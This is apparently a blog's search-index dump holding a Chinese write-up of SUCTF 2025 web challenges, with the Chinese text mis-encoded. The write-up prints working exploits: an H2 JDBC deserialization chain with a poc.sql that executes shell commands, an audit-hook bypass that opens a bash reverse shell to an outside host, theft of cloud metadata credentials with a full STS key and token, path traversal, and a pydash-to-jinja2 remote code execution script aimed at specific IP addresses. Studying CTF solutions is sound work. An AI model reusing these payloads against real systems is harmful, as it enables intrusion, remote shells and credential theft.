\u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; 